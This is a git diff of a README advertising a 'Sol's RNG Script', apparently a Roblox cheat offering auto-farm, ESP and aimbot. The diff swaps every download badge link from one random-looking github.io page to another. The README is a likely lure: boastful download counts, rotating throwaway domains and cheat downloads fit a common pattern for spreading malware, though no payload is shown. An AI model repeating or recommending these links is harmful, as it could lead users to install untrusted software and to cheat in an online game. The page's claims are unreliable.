@@ -4,7 +4,7 @@
 ![Downloads](https://img.shields.io/badge/Downloads-150K+-blueviolet?style=for-the-badge)
 ![Status](https://img.shields.io/badge/Status-Working%202026-blueviolet?style=for-the-badge)
 
-[![Download Sol's RNG Script](https://img.shields.io/badge/Download%20Sol's%20RNG%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://phantommofence.github.io/download-win/)
+[![Download Sol's RNG Script](https://img.shields.io/badge/Download%20Sol's%20RNG%20Script-blueviolet?style=for-the-badge&logo=roblox&logoColor=white)](https://beatowlrouse.github.io/windownload/)
 
 ---
 
@@ -49,9 +49,9 @@ The most reliable **Sol's RNG Script** for Sol's RNG — auto-farm, ESP, aimbot,
 
 <div align="center">
 
-[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://phantommofence.github.io/download-win/)
+[![Download for Windows](https://img.shields.io/badge/Download_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
 
-[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://phantommofence.github.io/download-mac/)
+[![Download for macOS](https://img.shields.io/badge/Download_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 </div>
 
